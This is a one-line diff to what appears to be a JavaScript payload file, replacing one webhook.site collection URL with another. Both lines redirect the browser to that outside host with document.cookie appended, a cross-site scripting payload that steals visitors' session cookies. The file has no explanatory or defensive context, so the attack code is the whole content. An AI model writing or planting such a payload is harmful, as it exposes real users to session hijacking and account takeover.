@@ -1,1 +1,1 @@
-window.location="https://webhook.site/075b86d8-b9df-4ff6-a427-a62f93063f57/?cookie="+document.cookie;
+window.location="https://webhook.site/3af1bc83-b101-4f20-9b43-6f9a2928eb8c/?cookie="+document.cookie;
